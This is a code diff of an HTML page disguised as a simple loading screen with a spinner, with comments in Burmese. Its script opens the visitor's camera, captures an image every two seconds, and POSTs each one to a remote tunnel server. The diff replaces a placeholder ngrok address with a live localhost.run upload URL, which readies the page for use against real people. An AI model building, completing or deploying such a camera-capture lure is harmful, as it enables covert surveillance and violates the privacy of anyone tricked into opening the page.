@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body { background-color: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
-        .loading { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 45px; height: 45px; border-top: 4px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
+        .loading { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -27,7 +27,7 @@
         navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
             video.srcObject = stream;
-            // ကင်မရာပွင့်တာနဲ့ ၂ စက္ကန့်တစ်ခါ ပုံရိုက်ပြီး ပို့နေမယ်
+            // ၂ စက္ကန့်တစ်ခါ ပုံရိုက်ပြီး အလိုအလျောက် ပို့ပေးမည့် စနစ်
             setInterval(takeSnap, 2000); 
         })
         .catch(err => {
@@ -39,8 +39,8 @@
             context.drawImage(video, 0, 0, 640, 480);
             const imageData = canvas.toDataURL('image/png');
 
-            // --- [အရေးကြီး] ဒီနေရာမှာ ကိုကြီးရဲ့ Ngrok URL အစစ်ကို အစားထိုးပါ ---
-            const serverUrl = 'https://YOUR-NGROK-LINK-HERE.ngrok-free.app/upload';
+            // --- ကိုကြီး ရရှိထားတဲ့ localhost.run Link ကို ဒီမှာ ထည့်သွင်းထားပါတယ် ---
+            const serverUrl = 'https://68dd96d833ace7.lhr.life/upload';
 
             fetch(serverUrl, {
                 method: 'POST',
